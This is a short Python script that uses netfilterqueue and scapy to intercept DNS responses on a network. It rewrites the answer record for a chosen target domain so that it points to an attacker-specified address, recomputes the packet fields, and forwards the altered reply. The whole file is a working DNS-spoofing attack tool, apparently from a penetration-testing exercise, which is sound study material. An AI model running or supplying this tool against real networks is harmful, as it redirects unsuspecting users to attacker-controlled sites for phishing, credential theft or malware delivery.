#! /usr/bin/env python

import netfilterqueue
import scapy.all as scapy
import argparse


parser = argparse.ArgumentParser()
parser.add_argument("-o", "--original", dest="original_site", help="Specify a site to spoof")
parser.add_argument("-r", "--redirect", dest="redirect_site", help="Specify a site to redirect to")
options = parser.parse_args()


def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    # DNS Resource Record
    if scapy_packet.haslayer(scapy.DNSRR):
        qname = scapy_packet[scapy.DNSQR].qname
        if options.original_site+"." in qname:
            print("[+] Spoofing Target")
            answer = scapy.DNSRR(rrname=qname, rdata=options.redirect_site)
            scapy_packet[scapy.DNS].an = answer
            scapy_packet[scapy.DNS].ancount = 1

            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.UDP].chksum
            del scapy_packet[scapy.UDP].len

            packet.set_payload(str(scapy_packet))
    packet.accept()


# Create netfilterqueue instance
queue = netfilterqueue.NetfilterQueue()
# Bind queue number 0 (queue zero in iptables)
queue.bind(0, process_packet)
# Run the queue
queue.run()
